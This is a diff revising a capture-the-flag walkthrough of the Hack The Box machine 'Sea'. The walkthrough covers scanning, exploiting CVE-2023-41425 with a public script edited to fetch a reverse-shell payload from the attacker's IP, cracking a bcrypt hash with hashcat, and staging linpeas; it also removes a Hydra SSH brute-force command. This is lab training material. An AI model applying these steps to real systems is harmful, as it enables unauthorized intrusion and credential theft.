@@ -25,19 +25,10 @@ sudo nmap -Pn -A -T4 sea.htb -oA initial.sea.htb
 ## nmap scan
 ![](Screenshots/Pasted_image_20260108154431.png)
 
-From the results it's evident that port 22 and 80 are open. Based off the description of this box our attack path will most likely be 80 because CVE-2023-41425 involves Reflected XSS in hopes a user interacts with the payload. Continuing on with our enumeration....
-
-## 22 - OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
-Normally when doing CTFs this port is not going to be the way into the box for initial footholds. If this is used it will be later down the road after an SSH key has been found or we have compromised some credentials...but just to make sure we can run a basic Hydra ssh brute force attack in the background.
-
-```bash
-hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt ssh://sea.htb
-```
-
-![](Screenshots/Pasted_image_20260108160524.png)
+From the results it's evident that port 22 and 80 are open. Based off the description of this box our attack path will most likely be 80 because CVE-2023-41425 involves a XSS workflow in hopes a user interacts with the payload. Continuing on with our enumeration....
 
 ## 80 - Apache httpd 2.4.41
-Now that we have that running in the background we can check out the web application along with running "feroxbuster" forced directory browsing tool to enumerate directories related to this application. This tool is great because it's simple syntax and also supports recursive fuzzing as well for our directory enumeration.
+Next, we’ll enumerate the web application using feroxbuster to identify interesting directories. Its simple syntax and recursive fuzzing support make it a solid choice for quickly mapping out the application.
 
 ``` bash
 feroxbuster --url http://sea.htb
@@ -57,7 +48,7 @@ When we land on this page and it provides a hyperlink in the body of text that s
 
 ![](Screenshots/Pasted_image_20260108163600.png)
 
-Alright so now we see that there is a registration form. Let’s test for reflected XSS behavior in the Website field.
+Alright so now we see that there is a registration form. Let’s test for XSS behavior in the Website field.
 
 ### Skip this if you want to go for flags, but if you want to hopefully learn something read on
 
@@ -112,13 +103,20 @@ When you have the file open there are 4 things you are going to want to do:
 ``` bash
 wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
 ```
-2.) Then delete the majority of the URL leaving `/main.zip`, so delete this 
-"https://github.com/prodigiousMind/revshell/archive/refs/heads"
-3.) Now replace your what you deleted with you attack ip/port:
-`http://YourIP/8000`
-4.) Lastly we will replace the variable "urlWithoutBase"'s value with the web application we are targeting, so it will look like:
-var urlWithoutLogBase = "http://sea.htb"new "; 
 
+2.) Then delete the majority of the URL leaving `/main.zip`, so deleting it should look like this: 
+"https://github.com/prodigiousMind/revshell/archive/refs/heads"
+
+3.) Now replace what you deleted with your attack ip/port.:
+```bash
+http://YourIP/8000
+```
+
+4.) Lastly we will replace the variable "urlWithoutLogBase"'s value with the web application we are targeting, so it will look like:
+
+```bash
+var urlWithoutLogBase = "http://sea.htb"; 
+```
 Now we can go ahead and save our file and close it to run our exploit. If you don't know how to use it you can just type in `python3 exploit.py
 `
 ![](Screenshots/Pasted_image_20260108175802.png)
@@ -160,7 +158,6 @@ Hit enter and then copy this to give you full shell functionality, like being ab
 export TERM=xterm
 ```
 # Post-Compromise Enumerations
-Okay so by now this box definitely shouldn't be marked as easy but we know how HTB is lol..
 As we can tell now we are not a valid user able to snag user.txt. We are "www-data". So we need to look around for misconfigurations or useful info in files.
 
 ```bash
@@ -188,7 +185,7 @@ hashcat -hh | grep -i blowfish
 ```
 ![](Screenshots/Pasted_image_20260108195505.png)
 
-Before we start cracking the password we should take a look again at our hash. It has extra back slashes, so it will end up becoming too long/malformed for hashcat to process. To append that we will run `sed`.
+Before we start cracking the password we should take a look again at our hash. It has extra back slashes, so it will end up becoming too long/malformed for hashcat to process. To address that we will run `sed`.
 
 ```bash
 sed -i 's#\\/#/#g' hash.txt
@@ -207,8 +204,6 @@ After a few minutes of letting this task run hashcat was able to crack our passw
 
 ![](Screenshots/Pasted_image_20260108205016.png)
 
-\
-
 After a few minutes of experimenting we have 2 leads. Not only did I authenticate to the application, but I also was able to switch users; to user amay. At this point I can probably go ahead and grab out first flag in that users directory.
 
 ![](Screenshots/Pasted_image_20260108205316.png)
@@ -218,7 +213,7 @@ Time to start probing around with our new access. We don't see anything to inter
 
 ![](Screenshots/Pasted_image_20260108205720.png)
 
-After a few minutes I got bored of the application so I moved back over to our shell, still as user amay. My next logical step was to upload linpeas onto the box. I quickly ran `wget` to see if it was installed on the box (it was) and then hosted up linpeas from my Kali box. Kali has this downloaded by default in the `/opt/linpeas` directory.
+After a few minutes of nothing of use in the application I moved back over to our shell. My next logical step was to upload linpeas onto the box. I quickly ran `wget` to see if it was installed on the box (it was) and then hosted up linpeas from my Kali box. Kali has this downloaded by default in the `/opt/linpeas` directory.
 
 ```bash
 python3 -m http.server
@@ -284,7 +279,7 @@ Upon hitting enter to navigate to this site we are prompted with a Basic Authent
 
 ![](Screenshots/Pasted_image_20260108225210.png)
 
-We're brought to this screen that matches what we found on our target machine (system monitor). There isn't much going on here and I know this is the right place to be so I'm going to open up Burp and capture capture some of the traffic.
+We're brought to this screen that matches what we found on our target machine (system monitor). There isn't much going on here and I know this is the right place to be so I'm going to open up Burp and capture some of the traffic.
 
 ![](Screenshots/Pasted_image_20260108230714.png)
 
